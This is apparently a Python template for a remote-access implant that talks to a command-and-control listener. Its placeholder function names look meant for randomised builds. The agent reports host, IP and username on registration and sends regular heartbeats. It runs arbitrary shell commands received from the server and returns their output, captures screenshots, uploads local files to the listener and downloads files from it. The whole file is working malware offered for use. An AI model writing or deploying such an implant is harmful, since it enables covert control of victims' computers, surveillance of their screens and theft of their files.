import os
import socket
import requests
import time
import threading
import warnings
from urllib3.exceptions import InsecureRequestWarning
import base64  # for encoding the screenshot
import pyautogui  # for capturing the screenshot
import io

# Suppress only the InsecureRequestWarning from urllib3
warnings.simplefilter('ignore', InsecureRequestWarning)

LISTENER_IP = '127.0.0.1'  # Adjust as necessary
LISTENER_PORT = 10001 # Adjust to match your listener's port
SECRET_KEY = "PASSWORD"  # Adjust to match your listener's secret key

AGENT_ID = None  # This will be set upon registration

def {{ function_name_gather_info }}():
    {{ hostname_var }} = socket.gethostname()
    {{ ip_address_var }} = socket.gethostbyname({{ hostname_var }})
    {{ username_var }} = os.getlogin()
    return {
        "hostname": {{ hostname_var }},
        "ip_address": {{ ip_address_var }},
        "username": {{ username_var }}
    }

def {{ function_name_register }}():
    global AGENT_ID
    {{ agent_data_var }} = {{ function_name_gather_info }}()
    headers = {
        'X-Secret-Key': SECRET_KEY,
        'Content-Type': 'application/json'
    }
    response = requests.post(f"http://{LISTENER_IP}:{LISTENER_PORT}/tag", headers=headers, json={{ agent_data_var }}, verify=False)
    
    if response.status_code == 200:
        AGENT_ID = response.json()['agent_id']
        print(f"Successfully registered with ID: {AGENT_ID}")
    else:
        print("Registration failed:", response.text)

def {{ function_name_heartbeat }}():
    while True:
        sleep_time = 10

        headers = {
            'X-Secret-Key': SECRET_KEY,
            'X-Agent-ID': AGENT_ID,
            'X-Sleep-Duration': str(sleep_time)
        }

        try:
            response = requests.get(f"http://{LISTENER_IP}:{LISTENER_PORT}/beat", headers=headers, verify=False)
            if response.status_code == 200:
                print("[+] Heartbeat acknowledged by server")
            else:
                print("[-] Heartbeat failed:", response.text)
        except Exception as e:
            print("[-] Heartbeat error:", str(e))
        
        time.sleep(sleep_time)

def capture_screenshot():
    screenshot = pyautogui.screenshot()
    
    # Create a bytes buffer and save the screenshot to it
    buffered = io.BytesIO()
    screenshot.save(buffered, format="PNG")
    
    # Encode the bytes to base64 and return
    return base64.b64encode(buffered.getvalue()).decode()


def {{ function_name_capture }}():
    screenshot = pyautogui.screenshot()
    
    # Create a bytes buffer and save the screenshot to it
    buffered = io.BytesIO()
    screenshot.save(buffered, format="PNG")
    
    # Encode the bytes to base64 and return
    return base64.b64encode(buffered.getvalue()).decode()

def {{ function_name_stream }}(file_path, chunk_size=8192):
    with open(file_path, 'rb') as f:
        chunk = f.read(chunk_size)
        while chunk:
            yield chunk
            chunk = f.read(chunk_size)


def {{ function_name_fetch }}(url, filename):
    headers = {
        'X-Secret-Key': SECRET_KEY,
        'X-Agent-ID': AGENT_ID # Convert to string since headers expect string values
    }
    try:
        response = requests.get(url, headers=headers, stream=True)
        response.raise_for_status()  # Raise an exception for HTTP errors

        with open(filename, 'wb') as out_file:
            for chunk in response.iter_content(chunk_size=8192):
                out_file.write(chunk)
                
        print(f"File saved to {filename}")
        return response
    except requests.RequestException as e:
        print(f"Error fetching file: {e}")
        return None

# Example usage:
#fetch_and_save_file(f"http://{SERVER_IP}:{SERVER_PORT}/download_file/{filename}", f"{filename}")

def {{ function_name_cmdloop }}():
    headers = {
        'X-Secret-Key': SECRET_KEY,
        'X-Agent-ID': AGENT_ID
    }
    while True:
        try:
            response = requests.get(f"http://{LISTENER_IP}:{LISTENER_PORT}/jobs/{AGENT_ID}", headers=headers)
            data = response.json()

            if "message" in data and data["message"] == "No unprocessed job available for this agent":
                print("No jobs available at the moment.")
            else:
                job = data
                command = job['command']

                if command == "!screenshot":
                    screenshot_data = capture_screenshot()
                    job_result_data = {
                        'job_id': job['_id'],
                        'output': "Screenshot captured successfully!",
                        'screenshot': screenshot_data
                    }

                # elif command.startswith("!download"):
                #     # Syntax: "!download /path/to/save/file.txt"
                #     save_path = command.split(" ", 1)

                #     file_download_response = requests.get(f"http://{LISTENER_IP}:{LISTENER_PORT}/download_file", headers=headers, stream=True, verify=False)
    
                #     if file_download_response.status_code == 200:
                #         with open(save_path, 'wb') as f:
                #             for chunk in file_download_response.iter_content(chunk_size=8192):
                #                 f.write(chunk)
                #         print("[+] File downloaded successfully!")
                #     else:
                #         print("[-] File download failed:", file_download_response.text)

                elif command.startswith("!download"):
                    # Syntax: "!download /path/to/local/file.txt"
                    file_worker = command.split(" ", 1)
                    file_path = file_worker[1]
                    print(file_path)
    
                    if not os.path.exists(file_path):
                        print("[-] File not found:", file_path)
                        continue

                    #headers['Content-Type'] = 'application/octet-stream'
                    headers = {
                        'X-Secret-Key': SECRET_KEY,
                        'X-Agent-ID': AGENT_ID,
                        'Content-Type' : 'application/json',
                        'X-Filename': os.path.basename(file_path) 
                    }


                    with open(file_path, 'rb') as file:
                        file_content = file.read()
                    files = {'file': (os.path.basename(file_path), file_content)}

                    # with open(file_path, 'rb') as file:
                    #     files = {'file': (os.path.basename(file_path), file)}
                    
                    
                    file_download_response = requests.post(f"http://{LISTENER_IP}:{LISTENER_PORT}/download_file", headers=headers, files=files)
                    #file_download_response = requests.post(f"http://{LISTENER_IP}:{LISTENER_PORT}/upload_file", headers=headers, data=stream_file_in_chunks(file_path))
    

                    if file_download_response.status_code == 200:
                        print("[+] File downloaded successfully!")
                        job_result_data = {
                            'job_id': job['_id'],
                            'output': 'File downloaded successfully!'
                        }
                    else:
                        print("[-] File download failed:", file_download_response.text)
                        job_result_data = {
                            'job_id': job['_id'],
                            'output': f"File download failed: {file_download_response.text}"
                        }



                elif command.startswith("!upload"):
                    file_worker = command.split(" ", 1)
                    file_path = file_worker[1]
                    filename = os.path.basename(file_path)
                    print(file_path)
                    
                    
                    file_upload_response = fetch_and_save_file(f"http://{LISTENER_IP}:{LISTENER_PORT}/upload_file/{filename}", f"{filename}")

                    if file_upload_response and file_upload_response.status_code == 200:
                        print("[+] File downloaded successfully!")
                        job_result_data = {
                            'job_id': job['_id'],
                            'output': 'File downloaded successfully!'
                        }
                    else:
                        error_message = file_upload_response.text if file_upload_response else "Error during file download"
                        print("[-] File download failed:", error_message)
                        job_result_data = {
                            'job_id': job['_id'],
                            'output': f"File download failed: {error_message}"
    }

                else:
                    result = os.popen(command).read()
                    print(result)  # Display the result on the agent side
                    job_result_data = {
                        'job_id': job['_id'],
                        'output': result
                    }

                # Send result back to the server
                result_response = requests.post(f"http://{LISTENER_IP}:{LISTENER_PORT}/job_result", headers=headers, json=job_result_data, verify=False)
                print(result_response.text)  # Display the response from the server regarding the result
        except Exception as e:
            print("[-] Command loop error:", str(e))
        time.sleep(5)

if __name__ == "__main__":
    {{ function_name_register }}()

    # Start the heartbeat and command loops in separate threads
    threading.Thread(target={{ function_name_heartbeat }}).start()
    threading.Thread(target={{ function_name_cmdloop }}).start()